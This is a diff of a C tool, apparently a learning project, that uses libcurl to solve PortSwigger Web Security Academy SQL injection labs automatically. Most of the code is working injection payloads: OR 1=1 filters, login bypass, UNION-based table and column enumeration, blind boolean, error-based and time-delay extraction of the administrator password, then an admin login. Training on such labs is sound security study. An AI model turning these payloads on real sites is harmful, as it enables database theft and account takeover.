@@ -4,7 +4,9 @@
 #include <unistd.h>
 #include <curl/curl.h>
 
-// https://github.com/emre-mr246/paas/
+// I made the PAAS C project to improve myself in C language.
+// linkedin -> https://www.linkedin.com/in/emregl/
+// github -> https://github.com/emre-mr246/paas/
 
 typedef struct {
     const char *lab_name;
@@ -12,11 +14,11 @@ typedef struct {
 } LabMapping;
 
 
-char url[200];
 CURL *curl;
+char url[200];
 char html_response[100000];
 char header_buffer[10000];
-
+char csrf_token[100];
 
 int extract_value_from_html_response(char* extracted_value, const char* value_start, const char* value_end, const int number_of_characters_to_skip) 
 {
@@ -35,7 +37,7 @@ int extract_value_from_html_response(char* extracted_value, const char* value_st
 }
 
 
-int match_lab_id() 
+int find_lab_id() 
 { 
     // PAAS supports the SQLi labs listed below
     LabMapping lab_mappings[] = {
@@ -116,7 +118,7 @@ void reset_curl_settings()
 }
 
 
-void login_as_administrator(const char *admin_password, const char *login_url, char *csrf_token, char *post_data) 
+void login_as_administrator(const char *admin_password, const char *login_url, char *post_data) 
 {
     curl_easy_setopt(curl, CURLOPT_COOKIE, "");
     curl_easy_setopt(curl, CURLOPT_URL, login_url);
@@ -133,7 +135,7 @@ void login_as_administrator(const char *admin_password, const char *login_url, c
 
 int is_lab_url() 
 {
-    if (strncmp(url, ".web-security-academy.net", 25) != 0)
+    if (strstr(url, ".web-security-academy.net") == NULL)
         return -1;
 
     const char *http_prefix = "http://";
@@ -171,21 +173,7 @@ int clear_url()
 }
 
 
-void show_paas_ascii_art() 
-{
-    system("clear");
-    printf("\033[38;5;208m  _____  \033[0m                 \033[38;5;208m _____ \n");
-    printf("\033[38;5;208m |  __ \\ \033[0m /\\       /\\    \033[38;5;208m/ ____|  \n");
-    printf("\033[38;5;208m | |__) | \033[0m/\\\\      /\\\\  \033[38;5;208m | (___    \n");
-    printf("\033[38;5;208m |  ___/\033[0m /  \\\\    /  \\\\ \033[38;5;208m \\\\___ \\\\ \n");
-    printf("\033[38;5;208m | | \033[0m   /====\\\\  /====\\\\  \033[38;5;208m____)  \n");
-    printf("\033[38;5;208m |_| \033[0m  /      \\\\/      \\\\ \033[38;5;208m|_____/ \n");
-    printf("\n[P]\033[0mortswigger \033[38;5;208m[A]\033[0mcademy \033[38;5;208m[A]\033[0mutomatic \033[38;5;208m[S]\033[0molver \n");
-    printf("by \033[38;5;208mmr246\033[0m \n\n");
-}
-
-
-int determine_column_count(char *html_response, char* header_buffer, CURL *curl, char* comment_sign) 
+int determine_column_count(char* comment_sign) 
 {
     int i = 1;
     int max_attempts = 15;
@@ -208,11 +196,23 @@ int determine_column_count(char *html_response, char* header_buffer, CURL *curl,
 }
 
 
-int redirect_to_the_solution_and_solve_the_lab() 
+int check_is_the_lab_solved()
 {
-    curl_global_init(CURL_GLOBAL_DEFAULT);
+    // If the lab has been solved, we make two requests to receive the response "Congratulations, you solved the lab!"
+    reset_curl_settings();
+    performCurlRequest();
+    performCurlRequest();
+    
+    if(strstr(html_response, "Congratulations, you solved the lab!") == 0)
+        return 0;
+    else
+        return -1;
+}
+
+
+int solve_the_lab(const int lab_to_be_solved) 
+{
     int column_count = -1, loop_until_column_count = -1;
-    char *csrf_token = (char*)calloc(64, sizeof(char));
     char sqli_payload[260] = "", sqli_payload_mid[150] = "", sqli_payload_end[150] = "";
     char users_table_name[25] = "", usernames_column_name[25] = "", passwords_column_name[25] = "";
     char admin_password[30] = "", password_temp[30] = "";
@@ -223,19 +223,6 @@ int redirect_to_the_solution_and_solve_the_lab()
     snprintf(login_url, 300, "%s/login", url);
     strncpy(url_temp, url, strlen(url) + 1);
 
-    curl = curl_easy_init();
-    if (!curl)
-        goto quit;
-
-    reset_curl_settings();
-    if (performCurlRequest() != 0)
-        goto quit;
-
-    int lab_to_be_solved = -1;
-    lab_to_be_solved = match_lab_id(html_response);
-
-    curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");
-
     if (lab_to_be_solved == 1) {
         // Lab name: "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"
         strncat(url, "/filter?category=Accessories'+or+1+=1--", 40);
@@ -243,6 +230,7 @@ int redirect_to_the_solution_and_solve_the_lab()
 
         performCurlRequest();
     }
+
     else if (lab_to_be_solved == 2) {
         // Lab name: "SQL injection vulnerability allowing login bypass"
         curl_easy_setopt(curl, CURLOPT_URL, login_url);
@@ -253,9 +241,10 @@ int redirect_to_the_solution_and_solve_the_lab()
         curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
         performCurlRequest();
     }
+
     else if (lab_to_be_solved == 3) {
         // Lab name: "SQL injection attack, querying the database type and version on Oracle"
-        column_count = determine_column_count(html_response, header_buffer, curl, "--");
+        column_count = determine_column_count("--");
 
         strncpy(sqli_payload, "/filter?category=Accessories'+UNION+SELECT+'abc'", sizeof(sqli_payload));
         strncpy(sqli_payload_mid, ",'test'", sizeof(sqli_payload_mid));
@@ -286,9 +275,10 @@ int redirect_to_the_solution_and_solve_the_lab()
         curl_easy_setopt(curl, CURLOPT_URL, url);
         performCurlRequest();
     }
+
     else if (lab_to_be_solved == 4) {
         // Lab name: "SQL injection attack, querying the database type and version on MySQL and Microsoft"
-        column_count = determine_column_count(html_response, header_buffer, curl, "%23");
+        column_count = determine_column_count("%23");
 
         strncpy(sqli_payload, "/filter?category=Accessories'+UNION+SELECT+'abc'", sizeof(sqli_payload));
         strncpy(sqli_payload_mid, ",'test'", sizeof(sqli_payload_mid));
@@ -320,9 +310,10 @@ int redirect_to_the_solution_and_solve_the_lab()
         curl_easy_setopt(curl, CURLOPT_URL, url);
         performCurlRequest();
     }
+
     else if (lab_to_be_solved == 5) {
         // Lab name: "SQL injection attack, listing the database contents on non-Oracle databases"
-        column_count = determine_column_count(html_response, header_buffer, curl, "--");
+        column_count = determine_column_count("--");
 
         // retrieve the list of tables in the database
         strncpy(sqli_payload, "/filter?category=Accessories'+UNION+SELECT+table_name", sizeof(sqli_payload));
@@ -384,12 +375,13 @@ int redirect_to_the_solution_and_solve_the_lab()
         extract_value_from_html_response(admin_password, "administrator", "<", 51);
 
         // login as administrator and solve the lab
-        login_as_administrator(admin_password, login_url, csrf_token, post_data);
+        login_as_administrator(admin_password, login_url, post_data);
         
     }
+
     else if (lab_to_be_solved == 6) {
         // Lab name: "SQL injection attack, listing the database contents on Oracle"
-        column_count = determine_column_count(html_response, header_buffer, curl, "--");
+        column_count = determine_column_count("--");
 
         // retrieve the list of tables in the database
         strncpy(sqli_payload, "/filter?category=Accessories'+UNION+SELECT+table_name", 100);
@@ -447,8 +439,9 @@ int redirect_to_the_solution_and_solve_the_lab()
         extract_value_from_html_response(admin_password, "administrator", "<", 51);
 
         // login as administrator and solve the lab
-        login_as_administrator(admin_password, login_url, csrf_token, post_data);
+        login_as_administrator(admin_password, login_url, post_data);
     }
+
     else if (lab_to_be_solved == 7) {
         // Lab name: "SQL injection UNION attack, determining the number of columns returned by the query"
         strncpy(sqli_payload, "'+UNION+SELECT+NULL", 100);
@@ -469,9 +462,10 @@ int redirect_to_the_solution_and_solve_the_lab()
             clear_url(url);
         }
     }
+
     else if (lab_to_be_solved == 8) {
         // Lab name: "SQL injection UNION attack, finding a column containing text"
-        column_count = determine_column_count(html_response, header_buffer, curl, "--");
+        column_count = determine_column_count("--");
 
         // extracting the text provided by the lab
         char *db_string;
@@ -510,6 +504,7 @@ int redirect_to_the_solution_and_solve_the_lab()
 
         }
     }
+
     else if (lab_to_be_solved == 9) {
         // Lab name: "SQL injection UNION attack, retrieving data from other tables"
         strncat(url, "/filter?category=Accessories'+UNION+SELECT+'abc','def'--", 57);
@@ -525,8 +520,9 @@ int redirect_to_the_solution_and_solve_the_lab()
         extract_value_from_html_response(admin_password, "administrator", "<", 51);
 
         // login as administrator and solve the lab
-        login_as_administrator(admin_password, login_url, csrf_token, post_data);
+        login_as_administrator(admin_password, login_url, post_data);
     }
+
     else if (lab_to_be_solved == 10) {
         // Lab name: "SQL injection UNION attack, retrieving multiple values in a single column"
         strncat(url, "/filter?category=Accessories'+UNION+SELECT+NULL,'abc'--", 56);
@@ -542,8 +538,9 @@ int redirect_to_the_solution_and_solve_the_lab()
         extract_value_from_html_response(admin_password, "administrator", "<", 51);
 
         // login as administrator and solve the lab
-        login_as_administrator(admin_password, login_url, csrf_token, post_data);
+        login_as_administrator(admin_password, login_url, post_data);
     }
+
     else if (lab_to_be_solved == 11) {
         // Lab name: "Blind SQL injection with conditional responses"
         // clearing the existing cookies for the "trackingId" cookie to be sent by the website
@@ -588,8 +585,9 @@ int redirect_to_the_solution_and_solve_the_lab()
             until_administrator_password_length++;
         }
         // login as administrator and solve the lab
-        login_as_administrator(admin_password, login_url, csrf_token, post_data);
+        login_as_administrator(admin_password, login_url, post_data);
     }
+
     else if (lab_to_be_solved == 12) {
         // Lab name: "Blind SQL injection with conditional errors"
         performCurlRequest();
@@ -627,8 +625,9 @@ int redirect_to_the_solution_and_solve_the_lab()
             until_administrator_password_length++;
         }
         // login as administrator and solve the lab
-        login_as_administrator(admin_password, login_url, csrf_token, post_data);
+        login_as_administrator(admin_password, login_url, post_data);
     }
+
     else if (lab_to_be_solved == 13) {
         // Lab name: "Visible error-based SQL injection"
         curl_easy_setopt(curl, CURLOPT_COOKIE, "TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--");
@@ -637,13 +636,15 @@ int redirect_to_the_solution_and_solve_the_lab()
         extract_value_from_html_response(admin_password, "integer: ", "\"", 10);
 
         // login as administrator and solve the lab
-        login_as_administrator(admin_password, login_url, csrf_token, post_data);
+        login_as_administrator(admin_password, login_url, post_data);
     }
+
     else if (lab_to_be_solved == 14) {
         // Lab name: "Blind SQL injection with time delays"
         curl_easy_setopt(curl, CURLOPT_COOKIE, "TrackingId=paas'||pg_sleep(10)--");
         performCurlRequest();
     }
+    
     else if (lab_to_be_solved == 15) {
         // Lab name: "Blind SQL injection with time delays and information retrieval"
         performCurlRequest();
@@ -672,7 +673,7 @@ int redirect_to_the_solution_and_solve_the_lab()
                 }
             until_administrator_password_length++;
         }
-        login_as_administrator(admin_password, login_url, csrf_token, post_data);
+        login_as_administrator(admin_password, login_url, post_data);
     }
     else {
         printf("[!] Invalid input! (error code: 7)\n");
@@ -680,47 +681,94 @@ int redirect_to_the_solution_and_solve_the_lab()
     }
 
     quit:
-        curl_easy_setopt(curl, CURLOPT_URL, url);
-        curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
-        performCurlRequest();
-        performCurlRequest();
-
-        int return_value = -1;
-        if (strstr(html_response, "Congratulations, you solved the lab!") != NULL)
-            return_value = 0;
-
-        if (csrf_token)
-            free(csrf_token);
-        curl_easy_cleanup(curl);
-        curl_global_cleanup();
-
-        return return_value;
+        if(check_is_the_lab_solved() == 0)
+            return 0;
+        else
+            return -1;
 }   
+
+
+void show_paas_ascii_art() 
+{
+    system("clear");
+    printf("\033[38;5;208m  _____  \033[0m                 \033[38;5;208m _____ \n");
+    printf("\033[38;5;208m |  __ \\ \033[0m /\\       /\\    \033[38;5;208m/ ____|  \n");
+    printf("\033[38;5;208m | |__) | \033[0m/\\\\      /\\\\  \033[38;5;208m | (___    \n");
+    printf("\033[38;5;208m |  ___/\033[0m /  \\\\    /  \\\\ \033[38;5;208m \\\\___ \\\\ \n");
+    printf("\033[38;5;208m | | \033[0m   /====\\\\  /====\\\\  \033[38;5;208m____)  \n");
+    printf("\033[38;5;208m |_| \033[0m  /      \\\\/      \\\\ \033[38;5;208m|_____/ \n");
+    printf("\n[P]\033[0mortswigger \033[38;5;208m[A]\033[0mcademy \033[38;5;208m[A]\033[0mutomatic \033[38;5;208m[S]\033[0molver \n");
+    printf("by \033[38;5;208mmr246\033[0m \n\n");
+}
+
+
+int get_url_as_input() 
+{
+    // "Lab URL: " text with some colorization.
+    printf("\033[38;5;208mLab URL\033[0m: ");
+
+    if (fgets(url, 200, stdin) == NULL)
+        return -1;
+
+    return 0;
+}
+
+
+int initialize_curl()
+{
+    curl_global_init(CURL_GLOBAL_DEFAULT);  
+    curl = curl_easy_init();
+
+    if (!curl)
+        return -1;
+
+    reset_curl_settings();
+    if (performCurlRequest() != 0) {
+        printf("Please make sure to proxy listener is open!");
+        return -1;
+    }
+
+    curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");
+    return 0;
+}
+
+
+void clear_curl()
+{
+    curl_easy_cleanup(curl);
+    curl_global_cleanup();
+}
+
+
+void exit_with_error_message(char *message) 
+{
+    printf("%s", message);
+    exit(-1);
+}
 
 
 int main() 
 {
     show_paas_ascii_art();
     
-    // "Lab URL:" text with some colorization
-    printf("\033[38;5;208mLab URL\033[0m: ");
+    if (get_url_as_input() != 0)
+        exit_with_error_message("[-] invalid input! (error in get_url_as_input() function.)\n");
 
-    if (fgets(url, 200, stdin) != NULL) {
-        if (clear_url(url) == 0 || is_lab_url(url) == 0) {
-            if (redirect_to_the_solution_and_solve_the_lab() == 0) {
-                printf("[+] Lab successfully solved!\n");
-                exit(0);
-            } else {
-                printf("[-] Something went wrong :(\n");
-                exit(-1);
-            }
+    if (is_lab_url(url) != 0)
+        exit_with_error_message("[-] invalid URL! (error in is_lab_url() function.)\n");
 
-        } else {
-            printf("[!] Invalid URL! (error in clear_url func or is_lab_url func)\n");
-            exit(-1);
-          }
-    } else {
-        printf("[!] Invalid URL! (error in fgets func)\n");
-        exit(-1);
-    }
+    if (clear_url(url) != 0 )
+        exit_with_error_message("[-] invalid URL! (error in clear_url() function.)\n");
+
+    if (initialize_curl() != 0)
+        exit_with_error_message("[-] curl initialization failed (error in initialize_curl() function.\n");
+   
+    if (solve_the_lab(find_lab_id(html_response)) == 0)
+        printf("[+] Lab successfully solved!\n");
+    else 
+        exit_with_error_message("[-] lab solution failed. (something went wront in solve_the_lab())\n");
+
+    clear_curl();
+
+    return 0;
 }
